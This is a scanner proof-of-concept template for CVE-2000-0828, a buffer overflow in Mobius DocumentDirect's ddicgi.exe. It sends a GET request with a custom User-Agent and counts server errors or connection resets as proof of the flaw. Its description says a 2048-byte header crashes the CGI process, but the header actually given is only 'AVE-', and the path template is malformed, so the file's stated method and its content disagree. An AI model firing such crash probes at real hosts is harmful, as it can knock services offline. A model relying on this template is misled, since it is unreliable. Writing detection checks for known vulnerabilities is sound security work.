[info]
author = "AVE"
description = "检测 Mobius DocumentDirect for the Internet 1.2 是否存在 ddicgi.exe 远程缓冲区溢出漏洞。通过发送超长 User-Agent 头部（2048 字节）触发 CGI 进程栈溢出，服务进程崩溃会导致 HTTP 500/502 错误或连接重置"
id = "POC-AVE-2000-0607"
name = "Mobius DocumentDirect ddicgi.exe User-Agent Buffer Overflow PoC"
severity = "critical"
tags = ["cve-2000-0828"]
vuln_id = [
    "CVE-2000-0828",
    "AVE-2000-0607",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ddrint/bin/ddicgi.exe"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE-"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server Error",
    "Service Unavailable",
    "Connection Reset",
]
